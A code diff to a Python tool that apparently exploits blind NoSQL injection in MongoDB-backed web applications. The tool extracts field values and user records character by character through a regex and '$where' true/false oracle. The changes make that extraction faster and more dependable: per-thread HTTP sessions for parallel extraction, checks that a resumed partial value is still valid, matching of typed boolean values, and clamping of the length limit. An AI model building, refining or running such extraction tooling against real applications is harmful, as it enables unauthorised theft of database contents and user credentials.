@@ -317,6 +317,19 @@ class Ctx:
         self.assert_regex = assert_regex   # regex that matches only the TRUE page
         self.assert_code = assert_code     # HTTP status that means TRUE
 
+    def clone(self):
+        # A fresh Ctx with its OWN requests.Session (requests.Session is not
+        # thread-safe: one per worker thread).  Config and learned dynamic
+        # regions are copied so the per-worker oracle behaves identically.
+        c = Ctx(headers=self.headers, verify=self.verify, csrf=self.csrf, timeout=self.timeout,
+                proxies=self.proxies, retries=self.retries, cookies=self.cookies,
+                assert_true=self.assert_true, assert_false=self.assert_false,
+                assert_regex=self.assert_regex, assert_code=self.assert_code,
+                param_fields=self.param_fields, json_template=self.json_template,
+                json_segmap=self.json_segmap)
+        c.dynamic = list(self.dynamic)
+        return c
+
 
 _DYN_LEN = 32
 _ISLAND_MIN = 8
@@ -1016,6 +1029,13 @@ def _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, ex
     return is_true
 
 
+def _typed_str(v):
+    # JS-canonical string for a typed value: booleans must be lowercase
+    # "true"/"false" so a later pin's String(this.field)===<v> can match what
+    # MongoDB renders (Python str(True) == "True" would never match).
+    return "true" if v is True else "false" if v is False else str(v)
+
+
 def _typed_excl(exclude):
     # Coerce already-found values to numbers so $nin can skip them on the
     # numeric path (extract() stores typed values as strings like "42").
@@ -1385,8 +1405,17 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
         length = _value_length(is_true, maxlen) if probe_length else None
         if length == 0:
             return ""
+        start = resume_start
+        if start:
+            # A resumed checkpoint may be stale (the data behind a re-used context
+            # key changed between runs).  Confirm the prefix still matches the LIVE
+            # oracle before trusting it; otherwise discard and walk fresh, so we
+            # never return a fabricated value from an out-of-date partial.
+            over_long = length is not None and len(start) > length
+            if over_long or not is_true("^" + re.escape(start)):
+                start = ""
         return _walk_value(is_true, charset, maxlen, label=label, widen=_CHARSET_FULL,
-                           start=resume_start, length=length, on_char=checkpoint)
+                           start=start, length=length, on_char=checkpoint)
 
     if ext_method in ("auto", "regex"):
         is_true = _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
@@ -1394,8 +1423,9 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
             return finish(walk(is_true))
         typed = _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
         if typed is not None:
-            print("    %s = %s (typed)" % (label, typed))
-            return finish(str(typed))
+            sval = _typed_str(typed)
+            print("    %s = %s (typed)" % (label, sval))
+            return finish(sval)
 
     if where and ext_method in ("auto", "where"):
         if where.get("time"):
@@ -1431,8 +1461,9 @@ def extract_record(base_url, method, vector, fields_literal, field_list, headers
         pin = {key: v0}
 
         def one(f):
+            wctx = ctx.clone()        # per-worker Session: requests.Session is not thread-safe
             return f, extract(base_url, method, vector, fields_literal, f, charset=charset,
-                              maxlen=maxlen, exclude=None, pin=dict(pin), ctx=ctx, where=where,
+                              maxlen=maxlen, exclude=None, pin=dict(pin), ctx=wctx, where=where,
                               ext_method=ext_method, store=store, label=f)
         with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
             for f, v in ex.map(one, field_list[1:]):
@@ -1509,10 +1540,10 @@ def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args
             return
         cs = (getattr(args, "extractCharset", None) or "default").lower()
         charset = {"alnum": _CHARSET_ALNUM, "full": _CHARSET_FULL}.get(cs, _CHARSET_DEFAULT)
-        try:
-            maxlen = int(getattr(args, "extractMax", None) or 64)
-        except (ValueError, TypeError):
-            maxlen = 64
+        try:                              # clamp positive: a 0/negative maxlen makes the
+            maxlen = max(1, min(4096, int(getattr(args, "extractMax", None) or 64)))
+        except (ValueError, TypeError):   # walk a no-op that stores "" as a complete value
+            maxlen = 64                    # and poisons the resume cache.
         multi = str(getattr(args, "extractUsers", "") or "").lower() == "y"
     elif batch:
         return
